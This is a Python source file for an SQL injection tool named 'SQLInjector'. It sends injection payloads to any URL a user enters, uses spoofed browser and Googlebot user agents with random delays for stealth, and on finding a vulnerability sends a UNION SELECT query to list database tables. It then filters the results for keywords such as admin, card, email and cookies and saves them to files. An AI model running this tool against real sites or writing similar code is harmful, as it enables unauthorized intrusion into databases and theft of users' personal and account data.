import requests
import time
import random
import threading
import sys
from colorama import Fore, Style, init

init(autoreset=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
]
TEST_PAYLOADS = [
    "' OR 1=1--",
    "\" OR 1=1--",
    "' OR 'a'='a",
    "\" OR \"a\"=\"a",
    "'; WAITFOR DELAY '0:0:5'--",
]
SENSITIVE_KEYWORDS = [
    "admin", "username", "card", "phone", "email", "log", "auth", "cookies"
]

SCORPION_ART = f"""{Fore.GREEN}
         ____            
        / . .\\           
        \  ---<           
         \  /             
   ______/ /              
  /       /               
 /      \/                
/      _/                 
(     /                   
 \    \                   
  \    \_,,              
   \     \\              
    )    ))              
   /    //               
  /   ((                 
 (    ))                 
  \\  (                  
   ))  \\                
   ((   )                
    \\ (                 
     ))                 
     ((                 
      \)                
      /                 
{Style.RESET_ALL}
"""

def get_random_headers():
    return {"User-Agent": random.choice(USER_AGENTS)}

def stealth_delay():
    time.sleep(random.uniform(1, 4))

def print_banner():
    print(SCORPION_ART)
    print(f"{Fore.GREEN}Copyright 2025 by elGabir\n")
    print(f"{Fore.MAGENTA}{'='*44}")
    print(f"{Fore.CYAN}   --- Welcome to SQLInjector ---")
    print(f"{Fore.MAGENTA}{'='*44}\n")

def spinner_loading(msg, stop_event):
    spinner = [Fore.YELLOW+'|', Fore.YELLOW+'/', Fore.YELLOW+'-', Fore.YELLOW+'\\']
    i = 0
    while not stop_event.is_set():
        sys.stdout.write(f"\r{msg} {spinner[i % 4]}{Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.12)
        i += 1
    sys.stdout.write('\r'+ ' '*(len(msg)+4) + '\r')
    sys.stdout.flush()

def scan_url(url, param="id", stealth=True):
    results = []
    vulnerable = False
    stop_event = threading.Event()
    thread = threading.Thread(target=spinner_loading, args=(Fore.CYAN+"Scanning for SQLi...", stop_event))
    thread.start()
    time.sleep(0.7)
    for payload in TEST_PAYLOADS:
        if stealth: stealth_delay()
        params = {param: payload}
        try:
            r = requests.get(url, params=params, headers=get_random_headers() if stealth else {})
            markers = ["syntax error", "mysql", "error in your sql", "you have an error", "invalid query", "unclosed quotation"]
            found_marker = any(marker in r.text.lower() for marker in markers)
            result_color = Fore.RED if found_marker else Fore.GREEN
            result = f"{result_color}VULNERABLE{Style.RESET_ALL}" if found_marker else f"{Fore.GREEN}Not Vulnerable{Style.RESET_ALL}"
            if found_marker: vulnerable = True
            results.append(f"{Fore.YELLOW}Payload: {payload} --> {result}")
        except Exception as e:
            results.append(f"{Fore.YELLOW}Payload: {payload} --> {Fore.RED}Error: {e}{Style.RESET_ALL}")
    stop_event.set()
    thread.join()
    print(f"{Fore.CYAN}Scan complete!\n")
    return results, vulnerable

def extract_data(url, param="id", stealth=True):
    extracted = []
    stop_event = threading.Event()
    thread = threading.Thread(target=spinner_loading, args=(Fore.MAGENTA+"Extracting data...", stop_event))
    thread.start()
    table_payload = "' UNION SELECT table_name, null FROM information_schema.tables--"
    if stealth: stealth_delay()
    params = {param: table_payload}
    try:
        r = requests.get(url, params=params, headers=get_random_headers() if stealth else {})
        if r.status_code == 200:
            text = r.text
            lines = [line.strip() for line in text.split('\n') if line.strip()]
            for line in lines:
                if "table" in line.lower():
                    extracted.append(line)
            if not extracted:
                extracted.append(text[:1000])
        else:
            extracted.append(f"HTTP {r.status_code}: Unable to extract data")
    except Exception as e:
        extracted.append(f"Error: {e}")
    stop_event.set()
    thread.join()
    print(f"{Fore.MAGENTA}Extraction complete!\n")
    return extracted

def extract_sensitive(data, keywords=SENSITIVE_KEYWORDS):
    found = []
    for line in data:
        for k in keywords:
            if k.lower() in line.lower():
                colored = Fore.LIGHTGREEN_EX + line + Style.RESET_ALL
                found.append(colored)
                break
    return found

def save_to_txt(lines, filename="output.txt"):
    with open(filename, "a", encoding="utf-8") as f:
        for line in lines:
            # Strip ANSI codes for file output
            simplified = ''.join(c for c in line if ord(c) < 128)
            f.write(simplified + "\n")
    print(f"{Fore.BLUE}[*] Output saved to {filename}")

def main():
    print_banner()
    print(Fore.LIGHTCYAN_EX+"Paste target URL (e.g. http://site.com/vuln.php): ", end="")
    url = input().strip()
    print(Fore.LIGHTCYAN_EX+"URL parameter to test (default 'id'): ", end="")
    param = input().strip() or "id"
    print(f"\n{Fore.CYAN}[*] Running in stealth mode...\n")
    scan_results, is_vulnerable = scan_url(url, param=param, stealth=True)
    save_to_txt(scan_results, "output.txt")
    print(Fore.YELLOW)
    for line in scan_results:
        print(line)
    if is_vulnerable:
        print(f"\n{Fore.RED}[*] Vulnerability detected! Trying to extract data...")
        extracted = extract_data(url, param=param, stealth=True)
        save_to_txt(extracted, "output.txt")
        # Sensitive extraction
        sensitive_lines = extract_sensitive(extracted)
        if sensitive_lines:
            print(f"\n{Fore.LIGHTGREEN_EX}[*] Sensitive keywords found! Saving to sensitive_output.txt ...")
            save_to_txt(sensitive_lines, "sensitive_output.txt")
            print(Fore.LIGHTGREEN_EX + "\n[*] Sensitive Info Found:")
            for s in sensitive_lines:
                print("   ", s)
        else:
            print(Fore.GREEN + "\n[*] No sensitive keywords found in extracted data.")
    else:
        print(Fore.GREEN + "\n[*] No obvious vulnerabilities detected.")
    print(Fore.MAGENTA + "\n=== Scan Complete ===")
    print(Fore.GREEN + "\nby elGabir\n")

if __name__ == "__main__":
    main()
